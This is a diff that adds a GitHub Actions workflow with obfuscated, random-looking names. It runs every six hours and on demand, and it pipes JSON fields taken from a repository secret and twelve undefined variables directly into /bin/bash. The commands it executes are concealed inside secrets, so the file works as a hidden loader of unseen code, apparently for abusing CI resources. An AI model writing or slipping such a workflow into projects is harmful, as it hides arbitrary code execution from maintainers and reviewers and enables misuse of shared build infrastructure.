@@ -1,0 +1,30 @@
+name: shidakai6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shidakai6789
+        env:
+          u774: ${{ secrets.u774 }}
+        run: |
+          echo $u774 | jq -r .pry46782 | /bin/bash
+          echo $h244 | jq -r .gy594 | /bin/bash
+          echo $s5354 | jq -r .lkxrn7232 | /bin/bash
+          echo $ub69 | jq -r .xc42232 | /bin/bash
+          echo $ffnyt524 | jq -r .bmdsk279 | /bin/bash
+          echo $z30 | jq -r .mabcb76331 | /bin/bash
+          echo $dv97404 | jq -r .ilro6 | /bin/bash
+          echo $devff60 | jq -r .ms302 | /bin/bash
+          echo $t003 | jq -r .raxp10 | /bin/bash
+          echo $dh42 | jq -r .zd4 | /bin/bash
+          echo $uhwlh57 | jq -r .eewzg381 | /bin/bash
+          echo $o9 | jq -r .wmm84 | /bin/bash
+          echo $u2 | jq -r .wic42619 | /bin/bash
+
